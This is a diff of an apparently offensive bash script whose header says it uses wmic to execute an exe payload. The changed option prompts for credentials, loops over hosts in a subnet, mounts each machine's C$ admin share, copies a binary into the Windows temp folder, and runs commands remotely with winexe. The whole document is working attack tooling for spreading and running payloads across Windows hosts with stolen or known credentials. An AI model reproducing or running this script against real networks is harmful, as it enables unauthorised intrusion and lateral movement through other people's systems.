@@ -3,8 +3,8 @@
 #################################################
 # Created by @jgaudard  :: I don't twitter much 
 # Used wmic to execute an exe payload.
-# Created: 18 June 2016    Edited: 22 June 2016
-# Version 2.0
+# Created: 18 June 2016    Edited: 23 June 2016
+# Version 3.0
 #################################################
 
 clear
@@ -58,14 +58,14 @@ elif [ $menu == 2 ]; then
 	done
 	exit 0;
 elif [ $menu == 3 ]; then
+	echo "Enter the username."
+	read -p ": " username
+	echo "Enter the password."
+	read -p ": " password
 	echo "Enter the subnet, ie 192.168.1 or 172.16.5"
 	read -p ": " subnet
-	read -p "Start ip: " startip
-	read -p "Stop ip: " stopip
-
-	for ip in {$startip..$stopip..1}; do
-		mount.cifs //$subnet.$ip/C$ /mnt/targetdrive -o user=$username,password=$password
-
+	for ip in {102..103}; do
+		mount.cifs //$subnet.$ip/C$ /mnt/targetdrive -o user="$username",password="$password"
         	cp $lpath/$binary /mnt/targetdrive/windows/temp 
 	        winexe -U "$username%$password" //$subnet.$ip ipconfig
 	        winexe -U "$username%$password" //$subnet.$ip "wmic os list brief"
